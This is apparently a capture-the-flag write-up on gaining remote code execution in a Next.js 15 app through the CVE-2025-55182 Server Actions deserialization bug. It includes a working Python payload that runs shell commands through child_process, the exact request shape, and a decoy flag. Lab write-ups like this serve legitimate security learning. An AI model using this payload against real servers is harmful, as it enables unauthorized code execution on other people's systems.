# Nexus Release Portal

This was a Next.js App Router app on port 5555. The response headers showed `X-Powered-By: Next.js` and the error banner leaked `next-server v15.0.4`. That version is inside the range for CVE-2025-55182, the React Server Components / Server Actions deserialization bug.

The app had a Server Action, so the exploit went in through a normal action POST. The request needs a `Next-Action` header and a multipart body containing the Flight chunks. The important pieces are the `_response._prefix` field and a `then` reference that reaches `constructor.constructor`, which gives you `Function` and then code execution during deserialization.

The payload I used looked like this:

```python
crafted = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": (
            "var res = process.mainModule.require('child_process')"
            ".execSync('id',{timeout:5000}).toString().trim();"
            "throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});"
        ),
        "_formData": {"get": "$1:constructor:constructor"},
    },
}
files = {"0": (None, json.dumps(crafted)), "1": (None, '"$@0"')}
requests.post(target, files=files, headers={"Next-Action": "x"})
```

The command output comes back in the React error digest, in the `1:E{"digest":"..."}` frame. `id` returned `uid=100(nexus) gid=101(nexus)`, which confirmed code execution.

The flag path was under `/var`. I read `/var/nexus/flag.txt` and it contained:

`AIT{r2s_f1ight_rce_pwn3d}`

That file turned out to be a decoy. The challenge was marked solved later by a teammate, after the instance was reset, and I do not have the accepted string in my notes. What I do have is the working RCE and the exact request shape above.

One warning: the app runs Node in a single process. A long command such as a full `find /` blocks the event loop and makes the whole instance stop answering. Keep the RCE commands short.
